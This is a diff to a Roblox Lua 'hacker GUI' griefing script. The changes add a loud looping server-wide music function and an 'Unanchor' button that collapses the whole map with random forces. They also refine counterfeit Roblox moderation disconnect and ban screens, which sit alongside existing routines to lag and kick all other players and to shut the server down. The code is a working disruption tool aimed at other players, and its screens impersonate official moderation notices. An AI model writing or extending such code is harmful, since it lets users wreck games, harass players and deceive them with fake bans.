@@ -21,7 +21,7 @@ hackerGui.ResetOnSpawn = false
 hackerGui.Parent = me:WaitForChild("PlayerGui")
 
 local main = Instance.new("Frame", hackerGui)
-main.Size = UDim2.new(0, 350, 0, 560)
+main.Size = UDim2.new(0, 350, 0, 600)
 main.Position = UDim2.new(0.3, 0, 0.3, 0)
 main.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
 main.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -134,7 +134,7 @@ local function hackAllParts()
             bbg.AlwaysOnTop = true
             
             local tlb = Instance.new("TextLabel", bbg)
-            tlb.Text = ""
+            tlb.Text = "666"
             tlb.Font = "SourceSansBold"
             tlb.TextColor3 = Color3.new(1, 0, 0)
             tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
@@ -202,6 +202,18 @@ local function playMusic2()
     end
 end
 
+-- MUSIC3 - Audible to ALL Players including YOU (ID: 1847661821)
+local function playMusic3()
+    if not workspace:FindFirstChild("Music3") then
+        local Music3 = Instance.new("Sound", workspace)
+        Music3.Name = "Music3"
+        Music3.SoundId = "rbxassetid://1847661821"
+        Music3.Looped = true
+        Music3.Volume = 10
+        Music3:Play()
+    end
+end
+
 -- SAXGUY - Audible to ALL Players including YOU
 local function playSaxGuy()
     if not workspace:FindFirstChild("EpicSaxGuy") then
@@ -237,7 +249,31 @@ local function firestorm()
     end
 end
 
--- Function to create EXACT Roblox Disconnect screen (Official Style - Error 1001)
+-- UNANCHOR - Unanchors ALL parts in the map (C00lkidd style)
+local function unanchorMap()
+    -- Unanchor all parts in workspace
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") and v.Anchored then
+            v.Anchored = false
+            -- Add slight random velocity for chaos
+            local velocity = Instance.new("VectorForce", v)
+            velocity.Force = Vector3.new(
+                math.random(-500, 500),
+                math.random(0, 1000),
+                math.random(-500, 500)
+            )
+            velocity.RelativeTo = Enum.ActuatorRelativeTo.World
+        end
+    end
+    
+    -- Also unanchor the baseplate if it exists
+    local baseplate = workspace:FindFirstChild("Baseplate")
+    if baseplate then
+        baseplate.Anchored = false
+    end
+end
+
+-- Function to create EXACT Roblox Moderation Disconnect Screen (Error 1001)
 local function createRobloxDisconnectScreen(plr, errorCode)
     -- Create the disconnect GUI
     local disconnectGui = Instance.new("ScreenGui")
@@ -245,73 +281,73 @@ local function createRobloxDisconnectScreen(plr, errorCode)
     disconnectGui.ResetOnSpawn = false
     disconnectGui.Parent = plr:WaitForChild("PlayerGui")
     
-    -- Main frame (exact Roblox style - dark gray, minimal)
+    -- Main frame (exact Roblox moderation style)
     local frame = Instance.new("Frame", disconnectGui)
-    frame.Size = UDim2.new(0, 450, 0, 300)
-    frame.Position = UDim2.new(0.5, -225, 0.5, -150)
-    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    frame.Size = UDim2.new(0, 500, 0, 350)
+    frame.Position = UDim2.new(0.5, -250, 0.5, -175)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     frame.BorderSizePixel = 0
     frame.ZIndex = 10
     
     -- Roblox logo (top center)
     local logo = Instance.new("ImageLabel", frame)
-    logo.Size = UDim2.new(0, 100, 0, 30)
-    logo.Position = UDim2.new(0.5, -50, 0, 10)
+    logo.Size = UDim2.new(0, 130, 0, 40)
+    logo.Position = UDim2.new(0.5, -65, 0, 20)
     logo.BackgroundTransparency = 1
     logo.Image = "rbxassetid://128569219"  -- Roblox logo
     logo.ZIndex = 11
     
     -- Title
     local title = Instance.new("TextLabel", frame)
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.Position = UDim2.new(0, 0, 0, 50)
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 80)
     title.BackgroundTransparency = 1
     title.Text = "Disconnected"
     title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 22
+    title.TextSize = 30
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.ZIndex = 11
     
     -- Error message
     local msg = Instance.new("TextLabel", frame)
-    msg.Size = UDim2.new(1, -40, 0, 80)
-    msg.Position = UDim2.new(0, 20, 0, 90)
+    msg.Size = UDim2.new(1, -60, 0, 100)
+    msg.Position = UDim2.new(0, 30, 0, 130)
     msg.BackgroundTransparency = 1
     msg.Text = "You have been disconnected from the game.\n\nError Code: " .. errorCode
     msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 16
+    msg.TextSize = 18
     msg.TextColor3 = Color3.fromRGB(200, 200, 200)
     msg.TextWrapped = true
     msg.ZIndex = 11
     
-    -- Date and time
+    -- Date and time (WHITE like Roblox)
     local date = Instance.new("TextLabel", frame)
-    date.Size = UDim2.new(1, 0, 0, 20)
-    date.Position = UDim2.new(0, 0, 0, 180)
+    date.Size = UDim2.new(1, 0, 0, 25)
+    date.Position = UDim2.new(0, 0, 0, 240)
     date.BackgroundTransparency = 1
     date.Text = os.date("%m/%d/%Y %H:%M:%S")
     date.Font = Enum.Font.Code
-    date.TextSize = 12
-    date.TextColor3 = Color3.fromRGB(255, 255, 0)
+    date.TextSize = 13
+    date.TextColor3 = Color3.fromRGB(255, 255, 255)  -- WHITE
     date.ZIndex = 11
     
     -- Separator line
     local separator = Instance.new("Frame", frame)
     separator.Size = UDim2.new(1, -40, 0, 1)
-    separator.Position = UDim2.new(0, 20, 0, 210)
+    separator.Position = UDim2.new(0, 20, 0, 275)
     separator.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
     separator.BorderSizePixel = 0
     separator.ZIndex = 11
     
-    -- Leave button ONLY (centered, gray - exactly like Roblox)
+    -- Leave button ONLY (centered, gray - exactly like Roblox moderation)
     local leaveBtn = Instance.new("TextButton", frame)
-    leaveBtn.Size = UDim2.new(0, 180, 0, 35)
-    leaveBtn.Position = UDim2.new(0.5, -90, 0, 230)
+    leaveBtn.Size = UDim2.new(0, 200, 0, 40)
+    leaveBtn.Position = UDim2.new(0.5, -100, 0, 290)
     leaveBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
     leaveBtn.BorderSizePixel = 0
     leaveBtn.Text = "Leave"
     leaveBtn.Font = Enum.Font.SourceSansBold
-    leaveBtn.TextSize = 16
+    leaveBtn.TextSize = 18
     leaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     leaveBtn.ZIndex = 11
     
@@ -343,7 +379,7 @@ local function createRobloxDisconnectScreen(plr, errorCode)
     end
 end
 
--- Function to create EXACT Roblox Ban screen (Official Style - Error 2002)
+-- Function to create EXACT Roblox Moderation Ban Screen (Error 2002 - Kick from Experience)
 local function createRobloxBanScreen(plr, errorCode)
     -- Create the ban GUI
     local banGui = Instance.new("ScreenGui")
@@ -351,84 +387,84 @@ local function createRobloxBanScreen(plr, errorCode)
     banGui.ResetOnSpawn = false
     banGui.Parent = plr:WaitForChild("PlayerGui")
     
-    -- Main frame (exact Roblox style - dark gray, minimal)
+    -- Main frame (exact Roblox moderation style)
     local frame = Instance.new("Frame", banGui)
-    frame.Size = UDim2.new(0, 450, 0, 320)
-    frame.Position = UDim2.new(0.5, -225, 0.5, -160)
-    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    frame.Size = UDim2.new(0, 500, 0, 380)
+    frame.Position = UDim2.new(0.5, -250, 0.5, -190)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     frame.BorderSizePixel = 0
     frame.ZIndex = 10
     
     -- Roblox logo (top center)
     local logo = Instance.new("ImageLabel", frame)
-    logo.Size = UDim2.new(0, 100, 0, 30)
-    logo.Position = UDim2.new(0.5, -50, 0, 10)
+    logo.Size = UDim2.new(0, 130, 0, 40)
+    logo.Position = UDim2.new(0.5, -65, 0, 20)
     logo.BackgroundTransparency = 1
     logo.Image = "rbxassetid://128569219"  -- Roblox logo
     logo.ZIndex = 11
     
     -- Title (red for ban)
     local title = Instance.new("TextLabel", frame)
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.Position = UDim2.new(0, 0, 0, 50)
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 80)
     title.BackgroundTransparency = 1
-    title.Text = "Account Banned"
+    title.Text = "Kicked from Experience"
     title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 22
+    title.TextSize = 30
     title.TextColor3 = Color3.fromRGB(255, 0, 0)
     title.ZIndex = 11
     
     -- Ban message
     local msg = Instance.new("TextLabel", frame)
-    msg.Size = UDim2.new(1, -40, 0, 80)
-    msg.Position = UDim2.new(0, 20, 0, 90)
+    msg.Size = UDim2.new(1, -60, 0, 100)
+    msg.Position = UDim2.new(0, 30, 0, 130)
     msg.BackgroundTransparency = 1
-    msg.Text = "Your account has been banned for violating\nRoblox Community Standards.\n\nError Code: " .. errorCode
+    msg.Text = "You have been kicked from this experience.\n\nError Code: " .. errorCode
     msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 16
+    msg.TextSize = 18
     msg.TextColor3 = Color3.fromRGB(200, 200, 200)
     msg.TextWrapped = true
     msg.ZIndex = 11
     
     -- Ban ID
     local banId = Instance.new("TextLabel", frame)
-    banId.Size = UDim2.new(1, 0, 0, 20)
-    banId.Position = UDim2.new(0, 0, 0, 180)
+    banId.Size = UDim2.new(1, 0, 0, 25)
+    banId.Position = UDim2.new(0, 0, 0, 240)
     banId.BackgroundTransparency = 1
     banId.Text = "Ban ID: " .. tostring(math.random(100000, 999999))
     banId.Font = Enum.Font.Code
-    banId.TextSize = 12
-    banId.TextColor3 = Color3.fromRGB(255, 255, 0)
+    banId.TextSize = 13
+    banId.TextColor3 = Color3.fromRGB(255, 255, 255)  -- WHITE
     banId.ZIndex = 11
     
-    -- Date and time
+    -- Date and time (WHITE like Roblox)
     local date = Instance.new("TextLabel", frame)
-    date.Size = UDim2.new(1, 0, 0, 20)
-    date.Position = UDim2.new(0, 0, 0, 205)
+    date.Size = UDim2.new(1, 0, 0, 25)
+    date.Position = UDim2.new(0, 0, 0, 270)
     date.BackgroundTransparency = 1
     date.Text = os.date("%m/%d/%Y %H:%M:%S")
     date.Font = Enum.Font.Code
-    date.TextSize = 12
-    date.TextColor3 = Color3.fromRGB(255, 255, 255)
+    date.TextSize = 13
+    date.TextColor3 = Color3.fromRGB(255, 255, 255)  -- WHITE
     date.ZIndex = 11
     
     -- Separator line
     local separator = Instance.new("Frame", frame)
     separator.Size = UDim2.new(1, -40, 0, 1)
-    separator.Position = UDim2.new(0, 20, 0, 235)
+    separator.Position = UDim2.new(0, 20, 0, 305)
     separator.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
     separator.BorderSizePixel = 0
     separator.ZIndex = 11
     
-    -- Leave button ONLY (centered, gray - exactly like Roblox)
+    -- Leave button ONLY (centered, gray - exactly like Roblox moderation)
     local leaveBtn = Instance.new("TextButton", frame)
-    leaveBtn.Size = UDim2.new(0, 180, 0, 35)
-    leaveBtn.Position = UDim2.new(0.5, -90, 0, 255)
+    leaveBtn.Size = UDim2.new(0, 200, 0, 40)
+    leaveBtn.Position = UDim2.new(0.5, -100, 0, 320)
     leaveBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
     leaveBtn.BorderSizePixel = 0
     leaveBtn.Text = "Leave"
     leaveBtn.Font = Enum.Font.SourceSansBold
-    leaveBtn.TextSize = 16
+    leaveBtn.TextSize = 18
     leaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     leaveBtn.ZIndex = 11
     
@@ -496,7 +532,7 @@ local function shutdownServer()
     game:Shutdown()
 end
 
--- BAN ALL - Official Roblox Ban (Error 2002)
+-- BAN ALL - Official Roblox Ban (Error 2002 - Kick from Experience)
 local function banAllPlayers()
     -- Step 1: Create lag effect for OTHER players
     for _, plr in pairs(Players:GetPlayers()) do
@@ -534,7 +570,7 @@ local function banAllPlayers()
     wait(5)
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= me then
-            plr:Kick("Banned: Error Code 2002")
+            plr:Kick("Kicked from Experience: Error Code 2002")
         end
     end
 end
@@ -705,4 +741,6 @@ makeButton("Night", nightMode, 0, 240)
 makeButton("Day/Night", dayNightCycle, 120, 240)
 makeButton("Skybox", skybox, 240, 240)
 makeButton("Music2", playMusic2, 0, 320)
-makeButton("Stop", stopMusicOnly, 120, 320)
+makeButton("Music3", playMusic3, 120, 320)
+makeButton("Unanchor", unanchorMap, 240, 320)
+makeButton("Stop", stopMusicOnly, 120, 360)
